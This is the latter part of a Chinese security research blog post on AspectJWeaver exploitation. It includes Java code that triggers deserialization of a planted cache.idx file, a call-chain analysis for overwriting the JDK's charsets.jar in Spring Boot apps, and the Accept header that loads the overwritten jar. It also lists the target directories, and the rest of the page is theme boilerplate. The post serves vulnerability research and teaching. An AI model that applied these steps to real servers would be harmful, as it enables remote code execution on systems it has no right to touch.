+         trace<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Error reading Storable Cache"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+      <span class="token punctuation">&#125;</span>  
+   <span class="token punctuation">&#125;</span>  
+  
+   <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">StoreableCachingMap</span><span class="token punctuation">(</span>folder<span class="token punctuation">,</span>storingTimer<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>该函数在SimpleCache类实例化时调用<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696052725529-3b58cd54-22c0-41d6-81ae-291bb7d84388.png#averageHue=%232c2c2b&clientId=uf8a3a4cf-9631-4&from=drop&id=u698cc62a&originHeight=358&originWidth=1027&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55164&status=done&style=none&taskId=u1de7e92f-f44f-4a99-8254-10605c5fbcb&title=" alt="Pasted image 20230930121033.png"><br>也就是说通过构造函数实例化SimpleCache类时，设置folder为cache.idx存在的目录，执行init时便会读取该文件的数据并进行反序列化<br>那么我们就可以将恶意序列化数据写入cache.idx，在通过构造函数实例化触发反序列化<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696052734267-baeac687-dde6-464a-985a-b75c6fb90d62.png#averageHue=%23393630&clientId=uf8a3a4cf-9631-4&from=drop&id=u134cfec2&originHeight=802&originWidth=893&originalType=binary&ratio=1&rotation=0&showTitle=false&size=157080&status=done&style=none&taskId=uf50b1da8-b800-4981-8e7c-d39a36523d3&title=" alt="Pasted image 20230930122030.png"><br>随便将一条链子写入cache.idx</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>aspectj<span class="token punctuation">.</span>weaver<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>cache<span class="token punctuation">.</span></span><span class="token class-name">SimpleCache</span></span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">public</span> <span class="token keyword">class</span> evil_cache <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>  
+        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> aClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.aspectj.weaver.tools.cache.SimpleCache"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> constructor <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token class-name">SimpleCache</span> o <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">SimpleCache</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"D:/tmp"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>成功执行<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696052741365-52cfd036-b139-4ddb-b086-5df97685c10e.png#averageHue=%238a7c5e&clientId=uf8a3a4cf-9631-4&from=drop&id=u6013dacf&originHeight=676&originWidth=1069&originalType=binary&ratio=1&rotation=0&showTitle=false&size=70280&status=done&style=none&taskId=ufbf9479f-f261-4980-b23f-c05e28a18f4&title=" alt="Pasted image 20230930122116.png"></p>
+<h3 id="写文件及后续利用！"><a href="#写文件及后续利用！" class="headerlink" title="写文件及后续利用！"></a>写文件及后续利用！</h3><h4 id="spring场景覆盖charset-jar"><a href="#spring场景覆盖charset-jar" class="headerlink" title="spring场景覆盖charset.jar"></a>spring场景覆盖charset.jar</h4><p><a target="_blank" rel="noopener" href="https://landgrey.me/blog/22/">https://landgrey.me/blog/22/</a><br>由于springboot项目将所有的依赖打包进了jar文件中，所以没法在程序运行时对其classpath中写入任何东西，但是在JDK目录下，系统的classpath目录可以被写入文件<br>这里有一个比较新颖的知识点：<br><code>vm 为了避免一下加载太多暂时用不到或者以后都用不到的类，不会在一开始运行时把所有的 JDK HOME 目录下自带的 jar 文件全部加载到类中，存在 &quot;**懒加载**&quot; 行为。主要特征就是相关 jar 文件的 Opened 操作没有在一开始就发生，而是调用到相关类时被触发。</code><br>文章内直接就指出了该文件 jre&#x2F;lib&#x2F;charsets.jar</p>
+<p>为什么是这个jar？启个spring服务调一下看看<br>看下spring-web组件中org.springframework.web.accept.HeaderContentNegotiationStrategy<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696052754695-c9c17213-54d6-4737-9650-85eaefda23f3.png#averageHue=%232d2c2c&clientId=uf8a3a4cf-9631-4&from=drop&id=uaaba6208&originHeight=746&originWidth=1942&originalType=binary&ratio=1&rotation=0&showTitle=false&size=186286&status=done&style=none&taskId=ued5a7420-ca7c-49b3-8460-a9436722e03&title=" alt="Pasted image 20230930124239.png"><br>对于每一次请求,spring服务都会获取其header头，并且进行处理<br>进入MediaType.parseMediaTypes<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696052760154-c4c92b40-8d5e-4279-b4b3-9e89739361f4.png#averageHue=%23897148&clientId=uf8a3a4cf-9631-4&from=drop&id=u1109e1d0&originHeight=615&originWidth=1528&originalType=binary&ratio=1&rotation=0&showTitle=false&size=120673&status=done&style=none&taskId=ud192c645-9dc2-4d8e-bd0a-27ee8625631&title=" alt="Pasted image 20230930124332.png"><br>将值传入parseMediaTypes中<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696052767402-89209b52-dd9c-4527-9e0b-020464511f90.png#averageHue=%2359704c&clientId=uf8a3a4cf-9631-4&from=drop&id=u8076154e&originHeight=949&originWidth=1740&originalType=binary&ratio=1&rotation=0&showTitle=false&size=230134&status=done&style=none&taskId=ub8030078-79e1-44eb-a85d-724ebfc5a31&title=" alt="Pasted image 20230930124439.png"><br>会将数据切片轮流进行parseMediaType<br>在parseMineType中，当mimeType开头为multipart，会进入parseMimeTypeInternal函数<br>会进行一系列的处理，然后进入new MimeType函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696052774353-3e21c1c4-9df1-4c87-b8a8-203c590461f9.png#averageHue=%23926f46&clientId=uf8a3a4cf-9631-4&from=drop&id=ua249e2d2&originHeight=475&originWidth=1636&originalType=binary&ratio=1&rotation=0&showTitle=false&size=104416&status=done&style=none&taskId=u9d98570d-88f1-41f3-a467-24095b3e8d1&title=" alt="Pasted image 20230930130635.png"><br>再进入checkParameters函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696052777847-5e6eb6b5-f915-4bdd-8fbe-805259996735.png#averageHue=%232d2c2b&clientId=uf8a3a4cf-9631-4&from=drop&id=u64a0fce2&originHeight=510&originWidth=1584&originalType=binary&ratio=1&rotation=0&showTitle=false&size=144709&status=done&style=none&taskId=ub6a47dfd-8224-4ad9-8f1d-06e23bb0dc8&title=" alt="Pasted image 20230930130646.png"><br>最后会使用Charset.forName()去加载指定字符集，此时会去加载charset.jar<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696052783006-4ddae32f-7d34-45da-8976-c3dc6996409c.png#averageHue=%232c2c2b&clientId=uf8a3a4cf-9631-4&from=drop&id=u1a91ee54&originHeight=583&originWidth=1628&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112178&status=done&style=none&taskId=ub3cbdaac-15f5-498a-8366-730694e9ec3&title=" alt="Pasted image 20230930130711.png"></p>
+<p>大概的调用路线</p>
+<pre class="line-numbers language-none"><code class="language-none">HeaderContentNegotiationStrategy.resolveMediaTypes
+	MediaType.parseMediaTypes ---&gt;parseMediaTypes---&gt;parseMediaType
+		MimeTypeUtils.parseMimeType ---&gt; parseMimeTypeInternal
+			new MimeType ---&gt; MimeType.checkParameters
+				Charset.forName(unquote(value))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>携带的Accpet头：</p>
+<pre class="line-numbers language-none"><code class="language-none">Accept: multipart&#x2F;aa;text&#x2F;html;charset&#x3D;GBK<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<p>我看网上的大部分poc都是没有multipart的，很怪，是我的问题么<br>用网络上的poc调了一遍，发现岔路口在于<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696052802381-ebf6095f-b37b-416e-8425-a5d31207c161.png#averageHue=%232e2d2c&clientId=uf8a3a4cf-9631-4&from=drop&id=u6f87e758&originHeight=415&originWidth=910&originalType=binary&ratio=1&rotation=0&showTitle=false&size=70756&status=done&style=none&taskId=uf80210be-3689-415d-b7bd-a5e3fdf4c9c&title=" alt="Pasted image 20230930132542.png"><br>后续的调用栈为<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696052808228-f4ad716c-df2f-40eb-b622-c9784ec78bf9.png#averageHue=%23504c42&clientId=uf8a3a4cf-9631-4&from=drop&id=uc0291b97&originHeight=321&originWidth=913&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54189&status=done&style=none&taskId=u8581bbd4-2a78-489d-a67d-0aea92fc426&title=" alt="Pasted image 20230930132626.png"><br>进入cachedMimeTypes.get，调用了this.generator.apply(key)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696052813831-c212479f-1498-4408-9dc4-73a1641b9439.png#averageHue=%232c2b2b&clientId=uf8a3a4cf-9631-4&from=drop&id=u898edac8&originHeight=441&originWidth=1551&originalType=binary&ratio=1&rotation=0&showTitle=false&size=77063&status=done&style=none&taskId=uec76a6b2-4d2e-4c93-8832-c7e70b0112f&title=" alt="Pasted image 20230930132753.png"><br>然后就会莫名其妙的进入了parseMimeTypeInternal，貌似是和lambda有关，但是我确实不太懂<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1696052818388-2581332e-d189-4b51-ad29-62d193a78f14.png#averageHue=%232d2c2b&clientId=uf8a3a4cf-9631-4&from=drop&id=uaa82d2e3&originHeight=330&originWidth=1584&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61981&status=done&style=none&taskId=ua0313860-b842-486c-b205-fa48dbf435d&title=" alt="Pasted image 20230930132924.png"><br>后续还是一样的，charset.jar就到此为止</p>
+<p>charset.jar常规目录</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-8-oracle&#x2F;jre&#x2F;lib&#x2F;
+&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-1.8-openjdk&#x2F;jre&#x2F;lib&#x2F;
+&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-8-openjdk-amd64&#x2F;jre&#x2F;lib&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>实际上不止charset.jar可以用，还有rj.jar等</p>
+<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>实际上AspectJWeaver写文件可以做的不仅仅只有这些，再一些CTF题目中也会和其他的依赖组合，例如snakeyaml、XML、XStream、fastjson等，包括其正向反序列化都是一个非常有意思的点</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/09/28/LFI-tools/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2023-09-30 13:48:26
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-text">利用链分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E7%A4%BA%E4%BE%8B%E7%BC%96%E5%86%99"><span class="toc-text">利用链示例编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">正向反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6%E5%8F%8A%E5%90%8E%E7%BB%AD%E5%88%A9%E7%94%A8%EF%BC%81"><span class="toc-text">写文件及后续利用！</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#spring%E5%9C%BA%E6%99%AF%E8%A6%86%E7%9B%96charset-jar"><span class="toc-text">spring场景覆盖charset.jar</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E5%B0%BE"><span class="toc-text">结尾</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  
+    <script async type="text/javascript" src='https://cdn.jsdelivr.net/npm/valine@1.4.18/dist/Valine.min.js' onload="loadValineSuc(this)"></script>
+  
+
+  <div id="vcomments"></div>
+
+  <script>
+    function loadValineSuc() {
+      new Valine({
+        el: '#vcomments',
+        appId: 'bNa2jesvrDl0f51DIPiFWHCO-gzGzoHsz',
+        appKey: 'UfLQ40Ou8xWfDtBEct4Yxct1',
+        placeholder: 'welcome!',
+        avatar: 'retro',
+        lang: 'en'
+      })
+    }
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + AspectJWeaver%E5%86%99%E6%96%87%E4%BB%B6%E5%8F%8A%E5%90%8E%E7%BB%AD%E5%88%A9%E7%94%A8 + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F09%2F30%2FAspectJWeaver%25E5%2586%2599%25E6%2596%2587%25E4%25BB%25B6%25E5%258F%258A%25E5%2590%258E%25E7%25BB%25AD%25E5%2588%25A9%25E7%2594%25A8%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/09/30/AspectJWeaver%E5%86%99%E6%96%87%E4%BB%B6%E5%8F%8A%E5%90%8E%E7%BB%AD%E5%88%A9%E7%94%A8/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
